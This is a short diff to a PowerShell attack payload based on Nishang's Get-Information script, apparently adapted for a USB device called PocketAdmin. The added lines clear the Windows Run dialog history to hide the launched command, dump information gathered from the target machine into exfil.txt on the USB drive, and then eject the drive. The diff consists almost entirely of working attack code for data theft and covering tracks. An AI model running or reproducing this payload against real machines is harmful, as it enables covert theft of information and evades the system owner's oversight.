@@ -1,7 +1,5 @@
 function Get-Information 
-
 {
-
 <#
 .SYNOPSIS
 Nishang Payload which gathers juicy information from the target.
@@ -80,6 +78,12 @@ https://github.com/samratashok/nishang
 
 }
 
+#clean runline history to hide the command launched by this payload
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
+
+#find correct driveletter, and path. Then save collected data into a file
 $driveletter=(Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
 Get-Information > ${driveletter}:\exfil.txt
+
+#eject the PocketAdmin's usb drive automatically
+(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${driveletter}:").InvokeVerb("Eject")
